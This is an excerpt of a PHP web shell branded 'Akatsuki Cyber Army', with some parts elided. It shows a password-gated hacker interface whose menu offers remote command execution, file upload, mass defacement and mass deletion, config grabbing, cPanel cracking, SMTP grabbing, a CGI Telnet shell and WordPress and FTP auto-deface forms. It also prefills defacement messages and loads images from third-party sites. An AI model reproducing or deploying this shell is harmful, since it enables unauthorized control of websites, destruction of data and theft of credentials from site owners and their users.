...
$auth_pass = "3d4e0173d472eaa6480f00527a850fd7"; 
$color = "#00ff00";
...
<html>
<head>
<title>[Akatsuki Cyber Army]</title>
<style type="text/css">
html {
    margin: 20px auto;
    background: #000000;
...
<header>
   <center>
   	<img src="http://www.jornaldonordeste.com//editor/images/Akatsuki%20Cyber%20Army.jpg">
   </center><br><br><br>
</header>
<body>
...
<head>
<title>[Akatsuki Cyber Army]</title>
<meta name='author' content='Akatsuki Cyber Army'>
<meta charset="UTF-8">
<style type='text/css'>
...
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=#0f0>OFF</font>";
...
echo "<div class=kotak><div class=kiri>";
...
echo "</div></div>";
echo "<br><center><img src=http://www.nuovaclean.it/tmp/a.jpg width=200></center><br>
<hr color=red>";
echo "<center>";
echo "<ul>";
echo "<li>>>  <a href='?'><font class=fitur>Home</a>  << </li>";    
echo "<li>>>  <a href='?dir=$dir&do=upload'><font class=fitur>Upload</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=cmd'><font class=fitur>Command</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=mass_deface'><font class=fitur>Mass Deface</a> << </li>";
echo "<li>>>  <a href='?dir=$dir&do=mass_delete'><font class=fitur>Mass Delete</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=config'><font class=fitur>Config</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=jumping'><font class=fitur>Jumping</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=cpanel'><font class=fitur>CPanel Crack</a>  << </li><br>";
echo "<li>>>  <a href='?dir=$dir&do=smtp'><font class=fitur>SMTP Grabber</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=zoneh'><font class=fitur>Zone-H</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=cgi'><font class=fitur>CGI Telnet</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=network'><font class=fitur>Network</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=adminer'><font class=fitur>Adminer</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=fake_root'><font class=fitur>Fake Root</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=auto_edit_user'><font class=fitur>Auto Edit User</a>  << </li>";
echo "<li><br>>>  <a href='?dir=$dir&do=auto_wp'><font class=fitur>Auto Edit Title WP</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=auto_dwp'><font class=fitur>WordPress Auto Deface</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=auto_dwp2'><font class=fitur>WordPress Auto Deface V.2</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=cpftp_auto'><font class=fitur>CPanel/FTP Auto Deface</a>  << </li>";
echo "<li>>>  <a href='?dir=$dir&do=krdp_shell'><font class=fitur>K-RDP Shell</a>  << </li><br>";
echo "<li>>>  <a style='color: red;' href='?logout=true'><font class=fitur>Logout</a>  << </li>";
echo "</ul>";
echo "</center>";
echo "<hr color=#0f0><marquee>Shell <font color=#0f0>Mr.b0g3L</font> & <font color=#0f0>./S4kur4</font> Recorded, Thank's You for All Member [ <font color=#0f0>Akatsuki Cyber Army</font> ]</marquee>";
if($_GET['logout'] == true) {
    ...
    <textarea name='script' style='width: 450px; height: 200px;'>Hacked by Akatsuki Cyber Army</textarea><br>
    ...
    if($_POST['hajar']) {
        ...
        echo "<center>
        <h1> <font color=red>.::</font><font color=#0f0> Auto Edit Title+Content WordPress</font><font color=red> ::.</font></h1>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set Title: <br>
        <input type='text' name='new_title' value='Hacked by Akatsuki Cyber Army' placeholder='New Title'><br><br>
        ...
        <textarea name='edit_content' placeholder='http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
        <input type='submit' name='hajar' value='Sikaat Kuyyy!!!' style='width: 450px;'><br>
        </form>
        <span color=#0f0>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
    }
    ...
    if($_POST['submit']) {
        ...
        <u>Defacer</u>: <br>
        <input type='text' name='nick' size='50' value='Akatsuki Cyber Army'><br>
        <u>Domains</u>: <br>
    ...
    if($_POST['auto_deface_wp']) {
        ...
        <input type='text' name='script' height='10' size='50' placeholder='Hacked by Akatsuki Cyber Army' required><br>
    ...
    echo "<center><font color=red >Copyright &copy; </font>".date("Y")." - <font color=lime>[ Akatsuki Cyber Army ]</font></a></center>";
}
?>
</body>
</html>